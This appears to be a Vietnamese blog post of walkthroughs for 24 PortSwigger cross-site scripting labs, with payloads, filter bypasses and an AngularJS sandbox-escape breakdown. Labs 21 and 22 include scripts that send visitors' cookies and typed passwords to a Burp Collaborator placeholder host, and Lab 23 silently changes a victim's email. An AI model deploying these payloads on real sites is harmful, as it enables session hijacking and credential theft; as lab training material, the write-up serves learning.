---
layout: post
title: "Cross-site scripting (XSS)"
render_with_liquid: false
categories:
  - Web Security
  - PortSwigger
tags:
  - portswigger
  - cross-site-scripting-xss
source_collection: notion_portswigger
---
Topics: Client-side

# **Lab 01: Reflected XSS into HTML context with nothing encoded**

1. Sao chép và dán nội dung sau vào hộp tìm kiếm:
    
    ```jsx
    <script>alert(1)</script>
    ```
    
2. Nhấp vào "Tìm kiếm".

# **Lab 02: Stored XSS into HTML context with nothing encoded**

1. Nhập thông tin sau vào hộp bình luận:
    
    ```jsx
    <script>alert(1)</script>
    ```
    
2. Nhập tên, email và trang web.
3. Nhấp vào "Đăng bình luận".
4. Quay lại blog, XSS được thực thi

# **Lab 03: DOM XSS in `document.write` sink using source `location.search`**

1. Nhập một chuỗi chữ và số ngẫu nhiên vào hộp tìm kiếm.
2. Nhấp chuột phải và kiểm tra phần tử và quan sát rằng chuỗi ngẫu nhiên của bạn đã được đặt bên trong thuộc tính `img src`.
3. Thoát ra khỏi thuộc tính `img` bằng cách tìm kiếm:
    
    ```jsx
    "><svg onload=alert(1)>
    ```
    

# **Lab 04: DOM XSS in jQuery anchor `href`attribute sink using `location.search` source**

Phòng thí nghiệm này chứa lỗ hổng DOM XSS trong trang Submit feedback. Nó sử dụng hàm chọn `$` của thư viện jQuery để tìm một phần tử anchor (thẻ &lt;a&gt;) và thay đổi thuộc tính `href` của nó bằng cách sử dụng dữ liệu từ `location.search`.

Để solve Lab, làm cho liên kết "back" link hiện alert document.cookie khi được ấn vào

**Sink**

```jsx
<script>
	function() {
	  $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	  });
</script>
```

1. Trên trang Submit feedback, thay đổi tham số truy vấn của `returnPath` thành `/` theo sau là 1 chuỗi và số ngẫu nhiên
2. Nhấp chuột phải và kiểm tra phần tử và quan sát rằng chuỗi ngẫu nhiên của bạn đã được đặt bên trong thuộc tính `href`. 
3. Thay đổi `returnPath` thành:
    
    ```python
    javascript:alert(document.cookie)
    => <a href=javascript:alert(document.cookie) />
    ```
    
4. Nhấn enter và nhấp vào "Back", xss được thực thi

# **Lab 05: DOM XSS in jQuery selector sink using a hashchange event**

Phòng thí nghiệm này chứa lỗ hổng DOM XSS trên trang chủ. Nó sử dụng chức năng selector `$()` của jQuery để tự động cuộn (auto-scroll) đến một bài đăng nhất định, có tiêu đề được chuyển qua thuộc tính `location.hash`.

**SINK**

```jsx
<script>
	$(window).on('hashchange', function(){
	  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
  });
</script>
```

1. Mở máy chủ exploit server
2. Trong phần Body, hãy thêm `iframe` độc hại sau:
    
    ```jsx
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    ```
    
3. Lưu trữ khai thác, sau đó nhấp vào Xem khai thác để xác nhận rằng hàm `print()` được gọi.
4. Quay lại máy chủ khai thác và nhấp vào Deliver to victim để giải phòng thí nghiệm.

# **Lab 06: Reflected XSS into attribute with angle brackets HTML-encoded**

Phòng thí nghiệm này chứa lỗ hổng XSS Reflected trong chức năng blog tìm kiếm. `Trong đó dấu ngoặc góc (&lt;) được mã hóa HTML`. Để giải quyết phòng thí nghiệm này, hãy thực hiện một cuộc tấn công tập lệnh chéo trang web chèn một thuộc tính và gọi chức năng `alert`

1. Gửi một chuỗi chữ và số ngẫu nhiên vào hộp tìm kiếm, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi nó đến Burp Repeater.
2. Quan sát rằng chuỗi ngẫu nhiên đã được phản ánh bên trong một thuộc tính được trích dẫn.
3. Thay thế đầu vào của bạn bằng payload sau để thoát khỏi thuộc tính được trích dẫn và chèn trình xử lý sự kiện:
    
    ```jsx
    "onmouseover="alert(1)
    ```
    
4. Xác minh kỹ thuật hoạt động bằng cách nhấp chuột phải, chọn "Sao chép URL" và dán URL vào trình duyệt. Khi bạn di chuyển chuột qua phần tử được tiêm, nó sẽ kích hoạt cảnh báo.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image.png)
    

# **Lab 07: Stored XSS into anchor `href` attribute with double quotes HTML-encoded**

1. Đăng comment với một chuỗi chữ và số ngẫu nhiên trong đầu vào "Website", sau đó sử dụng Burp Suite để chặn yêu cầu và gửi nó đến Burp Repeater.
2. Thực hiện yêu cầu thứ hai trong trình duyệt để xem bài đăng và sử dụng Burp Suite để chặn yêu cầu và gửi nó đến Burp Repeater.
3. Quan sát rằng chuỗi ngẫu nhiên trong tab Repeater thứ hai đã được phản ánh bên trong thuộc tính `href` của anchor &lt;a&gt;.
4. Lặp lại quy trình một lần nữa nhưng lần này thay thế đầu vào của bạn bằng tải trọng sau để chèn URL JavaScript gọi cảnh báo:
    
    ```jsx
    javascript:alert(1)
    ```
    
5. Xác minh kỹ thuật hoạt động bằng cách nhấp chuột phải, chọn "Sao chép URL" và dán URL vào trình duyệt. Nhấp vào tên phía trên nhận xét của bạn sẽ kích hoạt cảnh báo.

# **Lab 08: Reflected XSS into a JavaScript string with angle brackets HTML encoded**

1. Gửi một chuỗi chữ và số ngẫu nhiên vào hộp tìm kiếm, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi nó đến Burp Repeater.
2. Quan sát rằng chuỗi ngẫu nhiên đã được phản ánh bên trong một chuỗi JavaScript.
3. Thay thế đầu vào của bạn bằng tải trọng sau để thoát ra khỏi chuỗi JavaScript và chèn cảnh báo:
    
    ```jsx
    '-alert(1)-'
    ```
    
4. Xác minh kỹ thuật hoạt động bằng cách nhấp chuột phải, chọn "Sao chép URL" và dán URL vào trình duyệt. Khi bạn tải trang, nó sẽ kích hoạt cảnh báo.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%201.png)
    

# **Lab 09: DOM XSS in `document.write` sink using source `location.search` inside a select element**

Phòng thí nghiệm này chứa lỗ hổng DOM XSS trong chức năng kiểm tra chứng khoán. Nó sử dụng hàm `document.write`, ghi dữ liệu ra trang. Hàm `document.write` được gọi với dữ liệu từ `location.search` mà bạn có thể kiểm soát bằng URL trang web. Dữ liệu được bao bọc trong một phần tử được chọn.

**SINK**

```jsx
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```

1. Trên các trang sản phẩm, lưu ý rằng JavaScript nguy hiểm trích xuất thông số `storeId` từ nguồn `location.search`. Sau đó, nó sử dụng `document.write` để tạo một tùy chọn mới trong phần tử select cho chức năng kiểm tra hàng tồn kho.
2. Thêm tham số truy vấn `storeId` vào URL và nhập một chuỗi chữ và số ngẫu nhiên làm giá trị của nó. Yêu cầu URL đã sửa đổi này.
3. Trong trình duyệt, lưu ý rằng chuỗi ngẫu nhiên của bạn hiện được liệt kê là một trong các tùy chọn trong danh sách thả xuống.
4. Nhấp chuột phải và kiểm tra danh sách thả xuống để xác nhận rằng giá trị của tham số `storeId` của bạn đã được đặt bên trong phần tử select.
5. Thay đổi URL để bao gồm tải trọng XSS phù hợp bên trong tham số `storeId` như sau:
    
    ```jsx
    product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
    ```
    

# **Lab 10: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

Phòng thí nghiệm này chứa lỗ hổng DOM XSS trong biểu thức AngularJS trong chức năng tìm kiếm.

AngularJS là một thư viện JavaScript phổ biến, nó scan nội dung của các nút HTML có chứa thuộc tính `ng-app` (còn được gọi là chỉ thị AngularJS). Khi một chỉ thị được thêm vào mã HTML, bạn có thể thực thi các biểu thức JavaScript trong dấu ngoặc nhọn kép. Kỹ thuật này rất hữu ích khi dấu angle brackets được mã hóa.

1. Nhập một chuỗi chữ và số ngẫu nhiên vào hộp tìm kiếm.
2. Xem nguồn trang và quan sát rằng chuỗi ngẫu nhiên của bạn được đặt trong chỉ thị `ng-app`.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%202.png)
    
3. Nhập biểu thức AngularJS sau vào hộp tìm kiếm:
    
    ```jsx
    {{$on.constructor('alert(1)')()}}
    ```
    
4. Nhấp vào tìm kiếm.

# **Lab 11: Reflected DOM XSS**

**SINK**

```jsx
eval('var searchResultsObj = ' + this.responseText);
```

1. Truy cập trang web mục tiêu và sử dụng thanh tìm kiếm để tìm kiếm một chuỗi kiểm tra ngẫu nhiên, chẳng hạn như `"XSS".`
2. Để ý rằng chuỗi được phản ánh trong phản hồi JSON được gọi là `search-results`.
3. Từ `Site Map` trang web, mở tệp `searchResults.js` và lưu ý rằng phản hồi JSON được sử dụng với lệnh gọi hàm `eval().`
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%203.png)
    
4. Bằng cách thử nghiệm với các chuỗi tìm kiếm khác nhau, bạn có thể xác định rằng phản hồi JSON đang thoát khỏi dấu ngoặc kép. Tuy nhiên, dấu gạch chéo ngược không được thoát khỏi.
5. Nhập cụm từ tìm kiếm sau:
    
    ```jsx
    \"-alert(1)}//
    ```
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%204.png)
    
6. Vì bạn đã chèn dấu gạch chéo ngược backslash và trang web không escape nó, khi phản hồi JSON cố gắng escape ký tự nháy đôi, nó sẽ thêm dấu gạch chéo ngược backslash thứ hai. Kết quả là 2 dấu gạch chéo ngược khiến việc escape bị hủy bỏ một cách hiệu quả. Điều này có nghĩa là dấu ngoặc kép được xử lý mà không escape, điều này sẽ đóng chuỗi sẽ chứa cụm từ tìm kiếm.
7. Sau đó, một toán tử số học (trong trường hợp này là toán tử trừ) được sử dụng để phân tách các biểu thức trước khi hàm `alert()` được gọi. Cuối cùng, một dấu ngoặc nhọn đóng và hai dấu gạch chéo về phía trước sẽ đóng đối tượng JSON sớm và comment phần còn lại của đối tượng. Kết quả là, phản hồi được tạo như sau:
    
    ```jsx
    {"searchTerm":"\\"-alert(1)}//", "results":[]}
    ```
    

# **Lab 12: Stored DOM XSS**

**SINK**

```jsx
function escapeHTML(html) {
	return html.replace('<', '&lt;').replace('>', '&gt;');
}
if (comment.body) {
  let commentBodyPElement = document.createElement("p");
  commentBodyPElement.innerHTML = escapeHTML(comment.body);
	commentSection.appendChild(commentBodyPElement);
}
```

1. Đăng một bình luận có chứa vectơ sau:
    
    ```jsx
    <><img src=1 onerror=alert(1)>
    ```
    
2. Trong một nỗ lực để ngăn chặn XSS, trang web sử dụng hàm `JavaScript replace()` để mã hóa dấu ngoặc nhọn angle brackets. Tuy nhiên, khi đối số đầu tiên là một chuỗi, hàm chỉ thay thế lần xuất hiện đầu tiên. Chúng tôi khai thác lỗ hổng này bằng cách chỉ cần thêm một bộ dấu ngoặc góc ở đầu bình luận. Các dấu ngoặc góc này sẽ được mã hóa, nhưng bất kỳ dấu ngoặc góc nào tiếp theo sẽ không bị ảnh hưởng, cho phép chúng ta bỏ qua bộ lọc và chèn HTML một cách hiệu quả.

# **Lab 13: Reflected XSS into HTML context with most tags and attributes blocked**

Phòng thí nghiệm này chứa lỗ hổng XSS reflect trong chức năng tìm kiếm nhưng sử dụng tường lửa ứng dụng web (WAF) để bảo vệ chống lại các vectơ XSS phổ biến.

1. Chèn một vectơ XSS tiêu chuẩn, chẳng hạn như:
    
    ```jsx
    <img src=1 onerror=print()>
    ```
    
2. Quan sát rằng điều này bị chặn. Trong vài bước tiếp theo, chúng ta sẽ sử dụng Burp Intruder để kiểm tra thẻ và thuộc tính nào đang bị chặn.
3. Mở trình duyệt của Burp và sử dụng chức năng tìm kiếm trong phòng thí nghiệm. Gửi yêu cầu kết quả đến Burp Intruder.
4. Trong Burp Intruder, thay thế giá trị của cụm từ tìm kiếm bằng: `&lt;&gt;`
5. Đặt con trỏ giữa dấu ngoặc góc và nhấp vào Thêm **§** để tạo vị trí **tải trọng**. Giá trị của cụm từ tìm kiếm bây giờ sẽ giống như: `&lt;§§&gt;`
6. Truy cập  [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) và nhấp vào **Copy tags to clipboard**.
7. Trong bảng **Payloads**, trong **Payload configuration**, nhấp vào **Paste** để dán danh sách thẻ vào danh sách tải trọng. Nhấp vào Bắt đầu tấn công.
8. Khi cuộc tấn công kết thúc, hãy xem lại kết quả. Lưu ý rằng hầu hết các tải trọng gây ra phản hồi `400`, nhưng tải trọng `body` gây ra phản hồi `200`.
9. Quay lại Burp Intruder và thay thế cụm từ tìm kiếm của bạn bằng:
    
    ```jsx
    <body%20=1>
    ```
    
10. Đặt con trỏ trước ký tự `=` và nhấp vào Thêm § để tạo vị trí tải trọng. Giá trị của cụm từ tìm kiếm bây giờ sẽ giống như: `&lt;body%20§§=1&gt;`
11. Truy cập  [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) và nhấp vào **Copy events to clipboard**.
12. Trong bảng **Payloads**, trong **Payload configuration**, nhấp vào **Paste** để dán danh sách thẻ vào danh sách tải trọng. Nhấp vào Bắt đầu tấn công.
13. Khi cuộc tấn công kết thúc, hãy xem lại kết quả. Lưu ý rằng hầu hết các tải trọng đều gây ra phản hồi `400`, nhưng tải trọng `onresize` gây ra phản hồi `200`.
14. Truy cập máy chủ khai thác và dán mã sau, thay thế `YOUR-LAB-ID` bằng ID phòng thí nghiệm của bạn:
    
    ```jsx
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
    ```
    
15. Nhấp vào Lưu trữ và **Deliver exploit** cho nạn nhân.

# **Lab 14: Reflected XSS into HTML context with all tags blocked except custom ones**

Phòng thí nghiệm này chặn tất cả các thẻ HTML ngoại trừ các thẻ tùy chỉnh.

1. Truy cập máy chủ khai thác và dán mã sau, thay thế `YOUR-LAB-ID` bằng ID phòng thí nghiệm của bạn:
    
    ```jsx
    <script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>
    ```
    
2. Nhấp vào "Cửa hàng" và "Phân phối khai thác cho nạn nhân".

Việc chèn này tạo một thẻ tùy chỉnh với ID `x`, chứa trình xử lý sự kiện `onfocus` kích hoạt chức năng `alert`. Hàm băm ở cuối URL tập trung vào phần tử này ngay sau khi trang được tải, khiến tải trọng `alert`được gọi.

# **Lab 15: Reflected XSS with some SVG markup allowed**

Phòng thí nghiệm này có một lỗ hổng **Reflected** XSS đơn giản. Trang web đang chặn các thẻ phổ biến nhưng bỏ lỡ một số thẻ và sự kiện **SVG**.

1. Chèn tải trọng XSS tiêu chuẩn, chẳng hạn như:
    
    ```jsx
    <img src=1 onerror=alert(1)>
    ```
    
2. Quan sát rằng tải trọng này bị chặn. Trong vài bước tiếp theo, chúng ta sẽ sử dụng Burp Intruder để kiểm tra thẻ và thuộc tính nào đang bị chặn.
3. Mở trình duyệt của Burp và sử dụng chức năng tìm kiếm trong phòng thí nghiệm. Gửi yêu cầu kết quả đến Burp Intruder.
4. Trong mẫu yêu cầu, thay thế giá trị của cụm từ tìm kiếm bằng: `&lt;&gt;`
5. Đặt con trỏ giữa các dấu ngoặc góc và nhấp vào Thêm **`§`** để tạo vị trí tải trọng. Giá trị của cụm từ tìm kiếm bây giờ sẽ là: `&lt;§§&gt;`
6. Truy cập [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) XSS và nhấp vào **Copy tags to clipboard**.
7. Trong Burp Intruder, trong bảng **Payloads**, nhấp vào **Paste** để dán danh sách thẻ vào danh sách tải trọng. Nhấp vào **Start attack**.
8. Khi cuộc tấn công kết thúc, hãy xem lại kết quả. Quan sát rằng tất cả các tải trọng đều gây ra phản hồi `400`, ngoại trừ những tải trọng sử dụng thẻ `&lt;svg&gt;`, `&lt;animatetransform&gt;`, `&lt;title&gt;` và `&lt;image&gt;`, nhận được phản hồi `200`.
9. Quay lại tab Kẻ xâm nhập và thay thế cụm từ tìm kiếm của bạn bằng:
    
    ```jsx
    <svg><animatetransform%20=1>
    ```
    
10. Đặt con trỏ trước ký tự `=` và nhấp vào Thêm `§` để tạo vị trí tải trọng. Giá trị của cụm từ tìm kiếm bây giờ phải là:
    
    ```jsx
    <svg><animatetransform%20§§=1>
    ```
    
11. Truy cập [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) XSS và nhấp vào **Copy tags to clipboard**.
12. Trong Burp Intruder, trong bảng **Payloads**, nhấp vào **Paste** để dán danh sách thẻ vào danh sách tải trọng. Nhấp vào **Start attack**.
13. Khi cuộc tấn công kết thúc, hãy xem lại kết quả. Lưu ý rằng tất cả các tải trọng đều gây ra phản hồi `400`, ngoại trừ tải trọng `onstart`, gây ra `200` phản hồi.
14. Truy cập URL sau trong trình duyệt để xác nhận rằng hàm `alert()` được gọi và phòng thí nghiệm đã được giải quyết:
    
    ```jsx
    https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
    => 
    https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>
    ```
    

# **Lab 16: Reflected XSS in canonical link tag**

Phòng thí nghiệm này reflects thông tin đầu vào của người dùng trong thẻ link và escapes angle brackets dấu ngoặc nhọn.

Để hỗ trợ khai thác, bạn có thể giả định rằng người dùng mô phỏng sẽ nhấn các tổ hợp phím sau:

```jsx
ALT+SHIFT+X
CTRL+ALT+X
Alt+X
```

Phòng thí nghiệm này chỉ có thể thực hiện được trong Chrome.

1. Truy cập URL sau, thay thế `YOUR-LAB-ID` bằng ID phòng thí nghiệm của bạn:
    
    ```jsx
    https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
    ```
    
    Thao tác này đặt phím `X` làm khóa truy cập cho toàn bộ trang. Khi người dùng nhấn phím truy cập, chức năng `alert` sẽ được gọi.
    
2. Để kích hoạt khai thác chính mình, hãy nhấn một trong các tổ hợp phím sau:
    
    ```jsx
    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X
    ```
    

# **Lab 17: Reflected XSS into a JavaScript string with single quote and backslash escaped**

**SINK**

```jsx
<script>
    var searchTerms = 'test\'payload'; // Xảy ra ở đây, vì server render ra mà không validate
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">'); # có sử dụng encodeURIComponent nên payload bị encode ko thể dom xss được
</script>
```

Phòng thí nghiệm này chứa lỗ hổng **Reflected XSS** trong chức năng theo dõi truy vấn tìm kiếm. Sự phản chiếu xảy ra bên trong một chuỗi JavaScript với dấu ngoặc kép đơn và dấu gạch chéo ngược bị **escaped**

1. Gửi một chuỗi chữ và số ngẫu nhiên vào hộp tìm kiếm, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi nó đến Burp Repeater.
2. Quan sát rằng chuỗi ngẫu nhiên đã được phản ánh bên trong một chuỗi JavaScript.
3. Hãy thử gửi payload `test'payload` và quan sát thấy rằng dấu ngoặc kép duy nhất của bạn bị escape, ngăn bạn thoát ra khỏi chuỗi.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%205.png)
    
4. Thay thế đầu vào của bạn bằng tải trọng sau để thoát khỏi khối tập lệnh và chèn tập lệnh mới:
    
    ```jsx
    </script><script>alert(1)</script>
    ```
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%206.png)
    
5. Xác minh kỹ thuật hoạt động bằng cách nhấp chuột phải, chọn "Sao chép URL" và dán URL vào trình duyệt. Khi bạn tải trang, nó sẽ kích hoạt cảnh báo.

# **Lab 18: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

Phòng thí nghiệm này chứa lỗ hổng **Reflected XSS** trong chức năng theo dõi truy vấn tìm kiếm, trong đó dấu ngoặc nhọn và dấu ngoặc kép được mã hóa HTML và dấu ngoặc đơn được **escaped**.

1. Gửi một chuỗi chữ và số ngẫu nhiên vào hộp tìm kiếm, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi nó đến Burp Repeater.
2. Quan sát rằng chuỗi ngẫu nhiên đã được phản ánh bên trong một chuỗi JavaScript.
3. Hãy thử gửi `test'payload` tải trọng và quan sát thấy rằng dấu nháy đơn duy nhất của bạn bị escape bởi dấu gạch chéo ngược, ngăn bạn thoát ra khỏi chuỗi.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%207.png)
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%208.png)
    
4. Hãy thử gửi `test\payload` và quan sát rằng dấu gạch chéo ngược của bạn không bị escape.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%209.png)
    
5. Thay thế đầu vào của bạn bằng tải trọng sau để thoát ra khỏi chuỗi JavaScript và chèn cảnh báo:
    
    ```jsx
    \'-alert(1)//
    ```
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%2010.png)
    
6. Xác minh kỹ thuật hoạt động bằng cách nhấp chuột phải, chọn "Sao chép URL" và dán URL vào trình duyệt. Khi bạn tải trang, nó sẽ kích hoạt cảnh báo.

# **Lab 19: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

1. Đăng bình luận với chuỗi ký tự chữ và số ngẫu nhiên vào mục "Trang web", sau đó sử dụng Burp Suite để chặn yêu cầu và gửi đến Burp Repeater.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%2011.png)
    
2. Quan sát rằng chuỗi ngẫu nhiên trong tab Repeater thứ hai đã được phản ánh bên trong thuộc tính trình xử lý sự kiện `onclick`.
    
    ![{A49FB492-677C-4D94-9B11-BCD7CEF70BDB}.png](/assets/img/portswigger/cross-site-scripting-xss/A49FB492-677C-4D94-9B11-BCD7CEF70BDB.png)
    
3. Lặp lại quy trình một lần nữa nhưng lần này sửa đổi đầu vào của bạn để chèn URL JavaScript gọi `alert`, sử dụng tải trọng sau:
    
    ```python
    http://foo?&apos;-alert(1)-&apos;
    ```
    
    ![{21EBAE1C-B874-444E-A8FB-9A0882BAD795}.png](/assets/img/portswigger/cross-site-scripting-xss/21EBAE1C-B874-444E-A8FB-9A0882BAD795.png)
    

# **Lab 20: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

1. Gửi một chuỗi ký tự chữ và số ngẫu nhiên vào hộp tìm kiếm, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi đến Burp Repeater.
2. Lưu ý rằng chuỗi ngẫu nhiên đã được phản ánh bên trong chuỗi mẫu JavaScript.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%2012.png)
    
3. Thay thế đầu vào của bạn bằng đoạn mã sau để thực thi JavaScript bên trong chuỗi mẫu:
    
    ```python
    ${alert(1)}
    ```
    
4. Kiểm tra xem kỹ thuật này có hoạt động không bằng cách nhấp chuột phải, chọn "Sao chép URL" và dán URL vào trình duyệt. Khi bạn tải trang, cảnh báo sẽ xuất hiện.
    
    ![image.png](/assets/img/portswigger/cross-site-scripting-xss/image%2013.png)
    

# **Lab 21: Exploiting cross-site scripting to steal cookies**

1. XSS
    
    [https://www.notion.so](https://www.notion.so)
    
2. Gửi tải trọng sau trong bình luận blog
    
    ```python
    <script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>
    ```
    
    Tập lệnh này sẽ làm cho bất kỳ ai xem bình luận sẽ gửi yêu cầu POST có chứa cookie của họ đến tên Collaborator
    
3. Quay lại tab Cộng tác viên và nhấp vào "Poll Now". Bạn sẽ thấy một tương tác HTTP. Nếu bạn không thấy bất kỳ tương tác nào được liệt kê, hãy đợi vài giây rồi thử lại.

# **Lab 22: Exploiting cross-site scripting to capture passwords**

Gửi tải trọng sau trong bình luận blog, chèn miền phụ Cộng tác viên ợ hơi của bạn nếu được chỉ định:

```python
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Ghi lại giá trị tên người dùng và mật khẩu của nạn nhân trong nội dung POST.

# **Lab 23: Exploiting XSS to bypass CSRF defenses**

1. Đăng nhập bằng thông tin đăng nhập được cung cấp. Trên trang tài khoản người dùng của bạn, hãy lưu ý chức năng cập nhật địa chỉ email của bạn.
2. Nếu xem nguồn của trang, bạn sẽ thấy thông tin sau:
    
    Bạn cần đưa ra yêu cầu POST đến `/my-account/change-email`, với một tham số gọi là `email`.
    
    Form có sử dụng CSRF Token
    
    ![{93E8A75B-AE24-46EE-99EF-E1E9532A498A}.png](/assets/img/portswigger/cross-site-scripting-xss/93E8A75B-AE24-46EE-99EF-E1E9532A498A.png)
    
    Điều này có nghĩa là khai thác của bạn sẽ cần tải trang tài khoản người dùng, trích xuất mã CSRF, sau đó sử dụng mã csrf này để thay đổi địa chỉ email của nạn nhân.
    
3. Gửi tải trọng sau trong bình luận blog:
    
    ```python
    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>
    ```
    
    Điều này sẽ khiến bất kỳ ai xem bình luận đưa ra yêu cầu POST để thay đổi địa chỉ email của họ thành `test@test.com`.
    

# **Lab 24: Reflected XSS with AngularJS sandbox escape without strings**

Truy cập URL sau, thay thế `YOUR-LAB-ID` bằng ID phòng thí nghiệm của bạn:

```python
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Phần 1 – Override `charAt` (prototype pollution)**

Toàn bộ charAt của mọi chuỗi trong trang bị thay bằng join của Array – đây là một dạng prototype pollution.

```jsx
toString().constructor.prototype.charAt = [].join;
```

```jsx
120,61,97,108,101,114,116,40,49,41
=> chuỗi tạo ra là "x=alert(1)".
```

Tại sao làm vậy?

- AngularJS khi parse expression sẽ duyệt từng ký tự của chuỗi và dùng `charAt()` bên trong sandbox để kiểm tra xem một “từ” có phải identifier hợp lệ hay không (kiểm tra chữ cái, số, `_`, `$`, v.v.). [Medium+1](https://medium.com/%40929319519qq/learnings-from-portswigger-lab-reflected-xss-with-angularjs-sandbox-escape-without-strings-5895dda5af42)
- Khi ta thay `charAt` bằng `join`, hàm này **không còn trả về đúng 1 ký tự** nữa mà trả về một chuỗi “quái dị” (kiểu như ghép cả string với tham số), làm hỏng logic kiểm tra và khiến Angular nhầm cả chuỗi `"x=alert(1)"` thành một *identifier hợp lệ*. [Medium](https://medium.com/%40929319519qq/learnings-from-portswigger-lab-reflected-xss-with-angularjs-sandbox-escape-without-strings-5895dda5af42)

Nói nôm na: ta phá sandbox bằng cách **lừa bộ tokenizer** của AngularJS bằng một `charAt` bị hack.

**Phần 2 – Dùng `orderBy` + `fromCharCode` để sinh payload**

Đoạn tiếp theo:

```jsx
[1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) = 1

```

Tách nhỏ:

3.1 `[1] | orderBy: ...`

- Trong AngularJS, `|` không phải bitwise OR mà là **pipe để gọi filter**.
    
    Ví dụ: `[123] | orderBy:'someExpr'`.
    
- Ở đây, ta gửi mảng `[1]` vào filter `orderBy`.
- Tham số sau dấu `:` là **biểu thức sort** mà Angular sẽ parse & eval bằng `$parse`.

3.2 `toString().constructor.fromCharCode(...)`

- Như phần trên, `toString().constructor` là `String`.
- Nên `toString().constructor.fromCharCode(...)` chính là `String.fromCharCode(...)` nhưng viết vòng vèo để né sandbox (vì sandbox không cho dùng trực tiếp `String`). [CSDN Blog+1](https://blog.csdn.net/fffhhdd/article/details/131408443)
- Dãy số sinh ra chuỗi `"x=alert(1)"`.

Kết quả: AngularJS nhận được một **string biểu thức** là:

```jsx
"x=alert(1)"
```

và dùng nó làm **expression** bên trong `orderBy`. Khi sandbox đã bị phá (do `charAt` bị override), expression này **được coi là hợp lệ và được nhúng vào đoạn code mà Angular sinh ra**, dẫn tới việc thực thi `alert(1)`. [PortSwigger+1](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings?utm_source=chatgpt.com)

3.3 Cái `=1` cuối cùng là gì?

Ở phần query string:

```
... fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

```

- Về mặt HTTP, cái `=1` đó chỉ là **giá trị của tham số GET** kia.
- Phần tên tham số (trước dấu `=`) chính là đoạn Angular expression mà app sẽ nhét vào template.
- Nói đơn giản: **`lập trình viên phía server đang “nhét nguyên tên tham số” (là biểu thức Angular) vào trong template,`** vô tình cho phép ta **inject cả một biểu thức phức tạp** chứ không chỉ value đơn giản. [PortSwigger+1](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings?utm_source=chatgpt.com)

---

4. Tóm tắt logic tấn công

1. **Tạo string mà không cần dấu nháy** bằng `toString()` → lấy được `String` constructor qua `.constructor`.
